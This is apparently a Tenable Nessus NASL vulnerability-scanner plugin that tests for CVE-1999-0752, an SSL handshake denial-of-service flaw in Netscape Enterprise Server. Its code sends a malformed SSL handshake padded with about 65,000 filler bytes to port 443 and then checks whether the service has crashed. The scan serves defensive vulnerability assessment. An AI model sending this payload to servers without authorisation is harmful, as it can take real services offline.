#%NASL_MIN_LEVEL 70300
#
# (C) Tenable Network Security, Inc.
#

include('deprecated_nasl_level.inc');
include('compat.inc');

if (description)
{
  script_id(10155);
  script_version("1.37");
  script_set_attribute(attribute:"plugin_modification_date", value:"2022/04/11");

  script_cve_id("CVE-1999-0752");
  script_bugtraq_id(516);

  script_name(english:"Netscape Enterprise Server SSL Handshake DoS");

  script_set_attribute(attribute:"synopsis", value:
"The remote service is vulnerable to a denial of service attack.");
  script_set_attribute(attribute:"description", value:
"There is an SSL handshake bug in the remote secure web server that
could lead to a denial of service attack. 

An attacker may use this flaw to prevent your site from working 
properly.");
  # http://web.archive.org/web/20080325092453/http://www.propeller.com/FAQ
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?d073bf3e");
  script_set_attribute(attribute:"solution", value:
"Apply the appropriate vendor-supplied patch (see links).");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:OF/RC:C");

  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"1999/07/06");
  script_set_attribute(attribute:"plugin_publication_date", value:"1999/07/07");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:netscape:navigator");
  script_set_attribute(attribute:"thorough_tests", value:"true");
  script_end_attributes();

  script_category(ACT_DENIAL);
  script_family(english:"Web Servers");

  script_copyright(english:"This script is Copyright (C) 1999-2022 Tenable Network Security, Inc.");

  script_dependencies("find_service1.nasl", "http_version.nasl");
  script_require_keys("www/iplanet");
  script_require_ports(443);

  exit(0);
}

#
# The script code starts here
#

include("global_settings.inc");
include("misc_func.inc");

port = 443;
if (! get_port_state(port)) exit(0);

soc = open_sock_tcp(port, transport:ENCAPS_IP);
if (! soc) exit(1);

 s = raw_string(46, 46, 8,
 0x01, 0x03, 0x00, 0x00, 0x0c,
 0x00, 0x00, 0x00, 0x10, 0x02,
 0x00, 0x80, 0x04, 0x00, 0x80,
 0x00, 0x00, 0x03, 0x00, 0x00,
 0x06) + crap(length:65516, data:".");
 send(socket:soc, data:s);
 close(soc);
 sleep(5);

if (service_is_dead(port: port) > 0)
  security_warning(port);
